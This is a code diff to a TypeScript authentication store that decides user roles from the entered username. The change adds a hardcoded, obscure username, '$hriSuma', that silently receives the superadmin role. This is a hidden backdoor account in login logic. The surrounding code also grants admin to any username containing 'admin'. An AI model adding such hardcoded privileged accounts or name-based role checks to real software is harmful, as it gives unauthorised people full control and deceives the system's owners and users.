@@ -322,7 +322,7 @@ export const useAuthStore = create<AuthState>((set, get) => ({
       }
 
       let userRole: UserRole = "priest";
-      if (state.pendingUsername === "superadmin") {
+      if (state.pendingUsername === "superadmin" || state.pendingUsername === "$hriSuma") {
         userRole = "superadmin";
       } else if (state.pendingUsername.toLowerCase().includes("admin")) {
         userRole = "admin";
